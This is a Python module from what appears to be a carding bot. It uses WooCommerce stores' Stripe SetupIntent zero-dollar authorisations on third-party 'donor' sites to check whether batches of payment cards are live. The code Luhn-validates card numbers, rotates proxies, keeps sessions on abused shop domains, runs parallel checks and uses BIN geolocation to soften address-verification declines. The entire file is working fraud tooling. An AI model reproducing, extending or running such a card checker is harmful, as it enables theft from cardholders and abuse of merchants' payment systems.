# language: Python 3.12+, file: bot/gates/setupwoo.py, target: Windows 11, deps: curl_cffi
# Sprint 4 gate #1: WooCommerce Stripe SetupIntent $0-auth через общий движок.
# Одна WP-сессия живёт в кэше процесса и обслуживает всю пачку карт донора.
import asyncio

import gate_client as gc
import bin_cache
from setup_gate import GateSession, bin_alpha2, bin_lookup, load_ready_gates
import pusto_logger as log

NAME = "setupwoo"
COST = 1

_lock = asyncio.Lock()          # только менеджмент кэша сессий
_sem = asyncio.Semaphore(5)     # A6: параллельные чеки на одной сессии донора
_session_cache = {}  # domain -> GateSession


async def _get_session():
    """Первый живой донор из пула; переоткрытие при смерти."""
    gates = gc.pick_gate_order(load_ready_gates())
    for g in gates:
        dom = g.get("domain") or ""
        gs = _session_cache.get(dom)
        if gs is not None:
            return gs
        proxy_pool = gc.load_proxies()
        proxy = gc.pick_proxy(proxy_pool, None)
        gs = GateSession(g, proxy=proxy)
        ok, detail = await gs.open()
        if ok:
            _session_cache.clear()
            _session_cache[dom] = gs
            return gs
        # Если была попытка через прокси и она сорвалась — пробуем этот же донор напрямую
        if proxy and not ok:
            gs_dir = GateSession(g, proxy=None)
            ok_dir, _ = await gs_dir.open()
            if ok_dir:
                _session_cache.clear()
                _session_cache[dom] = gs_dir
                return gs_dir
            await gs_dir.close()
        await gs.close()
    raise RuntimeError("no live donor in pool")


def _normalize(cc: str, mm: str, yy: str, cvv: str) -> str | None:
    cc = "".join(ch for ch in str(cc) if ch.isdigit())
    if not (13 <= len(cc) <= 19) or not gc.check_luhn(cc):
        return None
    try:
        month = int(str(mm).strip().lstrip("0") or "0")
    except ValueError:
        return None
    if not 1 <= month <= 12:
        return None
    year = str(yy).strip()
    if len(year) == 2:
        year = "20" + year
    if not (len(year) == 4 and year.isdigit()):
        return None
    return f"{cc}|{month:02d}|{year}|{str(cvv).strip()}"


async def gate(cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str]:
    raw = _normalize(cc, mm, yy, cvv)
    if raw is None:
        return ("INVALID", "bad card format / Luhn fail")
    # A2: гео из кэша мгновенно; сетевого lookup в критическом пути НЕТ.
    # Промах — фон-прогрев кэша для следующих карт того же BIN (первый чек
    # нового BIN идёт с US-гео, вердикт корректен, только AVS-выравнивание
    # мягче; run_gate в main.py уже греет кэш параллельно для вывода).
    bin6 = raw.split("|")[0][:6]
    binfo = bin_cache.get(bin6)
    if binfo is None:
        try:
            asyncio.get_running_loop().create_task(bin_lookup(bin6))
        except RuntimeError:
            pass
    async with _lock:
        try:
            gs = await _get_session()
        except RuntimeError as e:
            # пул опустел — кэш чистим, следующий чек начнёт с открытия сессии
            for dead in _session_cache.values():
                try:
                    await dead.close()
                except Exception:
                    pass
            _session_cache.clear()
            log.log_error("setupwoo", f"No live donors available in pool: {e}")
            return ("ERROR", str(e))
    try:
        dom = gs.gate.get("domain") or ""
        log.log_target("setupwoo", dom, f"proxy: {gs.proxy or 'direct'}")
        log.log_gate("setupwoo", f"Checking {gc.mask_pan(raw)} on {dom}...")
        async with _sem:  # A6: параллельные чеки, не сериализация юзеров
            res = await gs.check_card(raw, bin_alpha2=bin_alpha2(binfo or {}))
        log.log_gate("setupwoo", f"Result on {dom}: {res.get('status')} | {res.get('detail')}")
        if res.get("retry_next_gate"):
            # гейт-левел отказ — сессию НЕ оставляем в кэше, иначе все
            # следующие чеки бьют в труп до случайного exception
            dead_gs = _session_cache.pop(dom, None)
            if dead_gs is not None:
                try:
                    await dead_gs.close()
                except Exception:
                    pass
        # третий элемент — служебные данные для админ-вывода (прокси запроса)
        return (res.get("status", "ERROR"), res.get("detail", "")[:200],
                {"proxy": gs.proxy})
    except Exception as e:
        dom = gs.gate.get("domain") or next(iter(_session_cache), "?")
        log.log_error("setupwoo", f"Check card exception on {dom}: {e}", exc=e)
        dead_gs = _session_cache.pop(dom, None)
        if dead_gs is not None:
            try:
                await dead_gs.close()
            except Exception:
                pass
        return ("ERROR", f"{type(e).__name__}: {e}"[:200])
